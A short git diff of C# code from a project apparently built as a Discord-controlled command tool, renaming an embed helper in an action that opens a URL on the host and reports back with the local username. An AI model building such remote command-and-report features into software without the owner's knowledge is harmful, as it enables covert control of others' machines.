@@ -1,6 +1,6 @@
 ﻿using System.Diagnostics;
 using Discord;
-using Paroxysm.Tools;
+using Paroxysm.Discord;
 
 namespace Paroxysm.Hooks.Actions;
 
@@ -16,12 +16,12 @@ public static class WebpageAction
                 UseShellExecute = true
             });
 
-            return EmbedCreator.CreateWithText(Color.Red, "Command was executed successfully.",
+            return DiscordEmbed.CreateWithText(Color.Red, "Command was executed successfully.",
                 $"Link {url} has been opened in default browser.", Environment.UserName, null);
         }
         catch
         {
-            return EmbedCreator.CreateWithText(Color.Red, "Command executed with errors",
+            return DiscordEmbed.CreateWithText(Color.Red, "Command executed with errors",
                 "Cannot open current webpage.", Environment.UserName, null);
         }
     }
